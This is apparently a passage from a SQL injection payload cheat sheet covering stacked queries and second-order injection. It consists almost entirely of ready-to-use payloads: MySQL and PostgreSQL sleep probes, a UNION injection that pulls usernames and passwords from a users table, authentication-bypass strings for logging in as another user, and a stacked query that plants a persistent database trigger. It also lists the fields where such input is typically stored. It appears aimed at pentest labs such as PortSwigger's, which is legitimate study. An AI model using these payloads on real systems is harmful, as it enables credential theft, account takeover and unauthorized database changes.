# STACKED QUERIES + SECOND-ORDER (write-path / multi-statement tricks)
# Stacked = multiple statements after a quote/terminator. Only some drivers allow it (PHP/PDO mysqli yes by default; PDO pgsql yes; most ORMs no).

1'; SELECT SLEEP(5)-- -
1'; SELECT pg_sleep(5)-- -

## 7) SECOND-ORDER - where it bites
# Profile page saves user-submitted fields (name, about, address, favorites) with
# parametrized INSERT (safe), then a LATER query builds FROM/WHERE/HAVING with that data unescaped.
# Attack: register/update profile with the payload as the field value:
#   For an app that later does: SELECT * FROM carts WHERE owner='<NAME>'
#   set NAME to:  ' UNION SELECT NULL,username,password FROM users-- -
# Blind hunting: set value to 1' AND pg_sleep(5)-- - then hit any page that uses the profile.
# Classic targets: reviews, display names, order shipping notes, "saved searches", usernames.
# Lab: PortSwigger "SQL injection with filter bypass via XML encoding" + second-order labs.

## 8) Second-order detection kit
name := 1' OR '1'='1
name := 1' AND SLEEP(5)-- -
name := x' AND 1=1-- -
about := ' UNION SELECT NULL,NULL,NULL-- -
address := 1' HAVING 1=1-- -
username := ' OR 'a'='a! - then login as that user
# Any field that end-stacks into a later dynamic query.

## 9) Self-persisting trigger (MySQL)
1'; CREATE TRIGGER pwn AFTER INSERT ON logs FOR EACH ROW BEGIN SELECT SLEEP(5); END-- -
# Then a normal insert triggers sleep - proves stacked + delayed second-order effect.
